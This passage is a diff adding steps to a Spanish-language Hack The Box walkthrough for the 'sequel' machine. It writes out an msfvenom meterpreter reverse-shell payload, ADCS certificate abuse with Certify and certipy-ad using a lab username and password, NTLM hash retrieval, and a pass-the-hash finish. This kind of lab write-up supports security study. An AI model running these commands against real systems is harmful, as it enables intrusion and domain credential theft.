@@ -76,3 +76,56 @@ Cambio la sesión a meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP de mi máquina} LPORT=1232 -f exe > xddd.exe 
 ~~~
 
+Ejecutamos exploit/multi/handler y ejecutamos el .exe en la máquina
+
+![imagen](https://user-images.githubusercontent.com/108554878/225094868-00bd831a-9d47-4a01-b2ec-85f9fa683d74.png)
+
+Vemos los privilegios que tenemos
+
+Calamos el exploit suggester y winpeas y no se encuentra nada interesante, después leyendo un poco encontré que se puede escalar privilegios con el uso de Active Directory Certificate Services
+
+https://posts.specterops.io/certified-pre-owned-d95910965cd2
+https://www.youtube.com/watch?v=ejmAIgxFRgM
+
+Intentamos user certify.exe recomendado para esto, encontramos que es vulnerable
+
+~~~
+.\Certify.exe find /vulnerable
+~~~
+
+![imagen](https://user-images.githubusercontent.com/108554878/225095523-726d8e18-c2b8-4be6-ba06-48c637752fa4.png)
+
+
+Al intentar aprovecharnos de esto da un error inesperado así que usamos certipy-ad que funciona también
+
+~~~
+certipy-ad find -vulnerable -stdout -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202
+~~~
+
+También nos encuentra la vulnerabilidad
+
+Obtenemos el certificado .pfx
+
+![imagen](https://user-images.githubusercontent.com/108554878/225095856-1153251a-5586-4bda-b75b-2514ded962a5.png)
+
+Y con esto conseguimos el hash NTLM de la máquina, con esto no necesitamos tocar lsass, ni escalar para conseguirlo
+
+![imagen](https://user-images.githubusercontent.com/108554878/225096019-cd865bf3-b1cc-4c24-b932-4d48fb15fc8d.png)
+
+Nos da un error, investigando es porque tenemos el tiempo desconfigurado
+
+![imagen](https://user-images.githubusercontent.com/108554878/225096143-6cd5d309-6fdb-4678-9dd7-bb721b5c8bd5.png)
+
+Cambiamos el tiempo
+
+Conseguimos el hash
+
+![imagen](https://user-images.githubusercontent.com/108554878/225096267-eba487d6-1b64-4845-8f26-e685b15a76c9.png)
+
+
+Hacemos un ataque pass-the-hash
+
+![HTB](https://user-images.githubusercontent.com/108554878/225096498-bfd3bfeb-9b47-446e-a2b8-a5d9160bfebe.png)
+
+Y Listo!
+
